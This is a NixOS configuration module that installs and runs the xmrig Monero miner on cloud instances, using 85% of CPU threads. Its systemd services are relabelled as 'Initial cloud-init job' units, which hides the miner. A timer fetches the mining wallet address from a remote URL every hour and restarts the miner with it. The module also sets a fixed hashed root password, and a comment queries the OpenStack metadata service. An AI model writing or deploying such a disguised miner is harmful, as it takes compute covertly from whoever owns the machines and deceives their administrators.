{
  config,
  lib,
  pkgs,
  ...
}:
let
  xmrigWalletUrl = "https://blobs.${config.domains.main}/xmr";
  xmrigWalletFile = "/tmp/xmrig.txt";
in
{
  services.xmrig = {
    enable = true;
    settings = {
      autosave = true;
      opencl = false;
      cuda = false;
      cpu = {
        # https://xmrig.com/docs/miner/config/cpu
        enabled = true;
        priority = 1;
        # 85% of $nproc threads
        max-threads-hint = lib.mkDefault 85;
      };
      # https://xmrig.com/docs/miner/hugepages
      randomx = {
        "1gb-pages" = true;
      };
      pools = [
        {
          url = "pool.hashvault.pro:443";
          # NOTE yes, this looks weird, and yes this works.
          user = "\${HASHVAULT_USER}";
          # TODO consider using the openstack hostname here
          # curl -s http://169.254.169.254/openstack/latest/meta_data.json | jq -r .name
          pass = config.networking.hostName;
          keepalive = true;
          tls = true;
        }
      ];
    };
  };

  systemd = {
    services.xmrig = {
      description = lib.mkForce "Initial cloud-init job (pre-networking)";
      # requires = [ "xmrig-config.service" ];
      # after = [ "xmrig-config.service" ];
      wantedBy = lib.mkForce [ ]; # disable auto start

      serviceConfig = {
        EnvironmentFile = xmrigWalletFile;
        Restart = "always";
        RestartSec = 10;
      };
    };

    services.xmrig-config = {
      description = "Initial cloud-init job (metadata service crawler)";
      after = [ "network.target" ];
      wantedBy = [ "multi-user.target" ];

      unitConfig = {
        StartLimitIntervalSec = 60; # Time window for counting failures
        StartLimitBurst = 3; # Maximum restart attempts in the above time
      };

      serviceConfig = {
        Type = "oneshot";
        Restart = "on-failure";
        RestartSec = 10;
      };

      path = [
        pkgs.curl
        pkgs.gawk
        pkgs.systemd
      ];

      script = ''
        set +e # nixos sets -x by default
        set -x

        PREV_WALLET="$(awk -F= '/HASHVAULT_USER/ {print $2}' '${xmrigWalletFile}' || true)"

        if WALLET="$(curl -fsSL '${xmrigWalletUrl}')" && \
           [[ -n "$WALLET" && "$WALLET" != "$PREV_WALLET" ]]
        then
          rm -f '${xmrigWalletFile}'
          echo "HASHVAULT_USER=$WALLET" > '${xmrigWalletFile}'
          systemctl restart xmrig
        fi
      '';
    };

    timers.xmrig-config = {
      wantedBy = [ "timers.target" ];

      timerConfig = {
        OnBootSec = "30";
        OnCalendar = "hourly";
        RandomizedDelaySec = "1800";
        Persistent = true;
      };
    };
  };

  # set keymap
  console.keyMap = "de";

  # sekurity
  services.getty.autologinUser = lib.mkForce null;

  users = {
    mutableUsers = false;
    users.root = {
      # hashedPassword = "!";
      hashedPassword = "$y$j9T$jESAnWexd1o0wWVdHBjQr.$CwFCe30wjNCkgKQ2z2ZS.SH6Q7pzGal215OkxnnV1p.";
    };

    users.nixos = {
      hashedPassword = "!";
    };
  };
}
